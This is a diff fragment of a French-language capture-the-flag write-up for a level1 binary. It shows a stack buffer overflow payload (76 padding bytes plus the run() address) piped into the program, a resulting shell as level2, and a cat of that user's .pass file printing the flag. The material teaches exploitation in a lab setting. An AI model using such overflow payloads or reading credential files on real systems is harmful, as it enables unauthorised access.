@@ -93,17 +93,17 @@ On trouve alors une fonction `run()` (endian: `08048444`) qui comprends un `fwri
 On va alors declencher notre overflow sur l'adresse `08048444` ("\x44\x84\x04\x08") et on l'envoie directement dans le binaire
 
 ```
-:~$ python -c 'print "a"*76 + "\x44\x84\x04\x08"' | ./level1
+:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' | ./level1
 :~$ Good... Wait what?
 :~$ Segmentation fault (core dumped)
 
-:~$ (python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
+:~$ (python -c 'print "a" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
 :~$ Good... Wait what?
-:~$ (input)
+$ (input)
 
-:~$ whoami
-:~$ level2
+$ whoami
+level2
 
-:~$ cat /home/user/level2/.pass
-:~$ 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+$ cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ...
